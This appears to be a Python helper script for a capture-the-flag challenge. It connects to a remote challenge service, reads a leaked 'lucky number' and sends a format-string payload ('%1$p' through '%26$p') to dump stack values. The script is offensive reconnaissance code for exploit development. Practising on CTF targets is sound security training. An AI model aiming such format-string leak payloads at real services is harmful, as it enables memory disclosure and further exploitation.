import socket, sys

HOST, PORT = 'chal.secso.cc', 4002

def recvuntil(s, tok, timeout=10):
    s.settimeout(timeout)
    buf = b''
    while not buf.endswith(tok):
        c = s.recv(1)
        if not c:
            raise EOFError('closed, got %r' % buf)
        buf += c
    return buf

def recvall(s, timeout=5):
    s.settimeout(timeout)
    out = b''
    try:
        while True:
            c = s.recv(4096)
            if not c:
                break
            out += c
    except socket.timeout:
        pass
    return out

def run(idx, in1, in2, timeout=10):
    s = socket.create_connection((HOST, PORT), timeout=timeout)
    recvuntil(s, b'Enter an index: ')
    s.sendall(str(idx).encode() + b'\n')
    r = recvuntil(s, b'\n')                       # "Your lucky number is 0x...\n"
    leak_line = r
    recvuntil(s, b'Enter the first input to be echoed: ')
    s.sendall(in1 + b'\n')
    recvuntil(s, b'Enter the second input to be echoed: ')
    s.sendall(in2 + b'\n')
    out = recvall(s)
    s.close()
    return leak_line, out

if __name__ == '__main__':
    idx = int(sys.argv[1]) if len(sys.argv) > 1 else 2
    fmt = sys.argv[2].encode() if len(sys.argv) > 2 else b'AAAAAAAA.%1$p.%2$p.%3$p.%4$p.%5$p.%6$p.%7$p.%8$p.%9$p.%10$p.%11$p.%12$p.%13$p.%14$p.%15$p.%16$p.%17$p.%18$p.%19$p.%20$p.%21$p.%22$p.%24$p.%26$p'
    leak, out = run(idx, fmt, b'BBBB')
    print('LEAK:', leak.decode(errors='replace').strip())
    print('OUT :', out.decode(errors='replace'))
